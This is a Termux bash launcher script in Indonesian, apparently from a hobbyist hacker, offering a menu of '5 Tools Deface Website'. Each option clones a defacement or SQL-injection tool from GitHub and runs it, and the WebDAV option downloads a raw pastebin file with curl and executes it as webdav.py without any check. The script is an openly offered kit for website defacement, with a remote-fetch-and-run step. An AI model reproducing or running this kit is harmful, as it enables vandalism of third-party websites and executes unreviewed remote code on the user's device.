#!/system/xbin/bash

clear
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet Welcome | lolcat
echo ""
echo "Peringatan...! Gunakan Tools Saya Dengan Bijak :) " |lolcat
sleep 1
echo ""
echo "========================================" |lolcat
echo           "Wellcome Tools : Mr.Andre.Wp                    " |lolcat
echo          "My Youtube     : AndreGamingWp            " |lolcat
echo          "My Website     : fightercxshacking.com " |lolcat
echo          "My Instagram   : @andre_wp475              " |lolcat
echo "========================================" |lolcat
echo ""
echo "      <<<~DAFTAR ISI~>>>" |lolcat
echo ""
echo "<<<~5 Tools Deface Website~>>>" |lolcat
echo ""
echo "1.  SQLMap"
echo "============================" | lolcat
echo "2.  Defacer"
echo "============================" | lolcat
echo "3.  Tebas Index"
echo "============================" | lolcat
echo "4.  Deface1"
echo "============================" | lolcat
echo "5.  Webdav"
echo "============================" | lolcat
echo "0.  EXIT"
echo "============================" | lolcat
echo ""
echo "╭─Pilih Bos" |lolcat
read -p "╰─#" pil;

if [ $pil = 1 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
python2 sqlmap.py
fi

if [ $pil = 2 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/21D4N404/Defacer.git
cd Defacer
sh ICA.sh
fi

if [ $pil = 3 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/tukangiseng/Tebasindex
cd Tebasindex
cd Tebas
sh Tebas.sh
fi

if [ $pil = 4 ]
then
clear
figlet WAIT.. |lolcat
git clone https://github.com/ClayHackerTeam/Deface1
cd Deface1
sh index.sh
fi

if [ $pil = 5 ]
then
clear
figlet WAIT.. |lolcat
apt update && upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install libcurl
ln -s /sdcard
cd sdcard
mkdir webdav
cd webdav
curl -k -O https://pastebin.com/raw/HnVyQPtR
mv HnVyQPtR webdav.py
python2 webdav.py
fi

if [ $pil = 0 ]
then
clear
figlet Thank You |lolcat
echo "ThanksUdahMakaiToolsSaya Gays(•_•)..." |lolcat
echo "SemogaBermanfaatBosskuhh(•_•)" |lolcat
echo "JanganLupaSubcsribeChannelYoutubeSayaGays(•_•)" |lolcat
exit
fi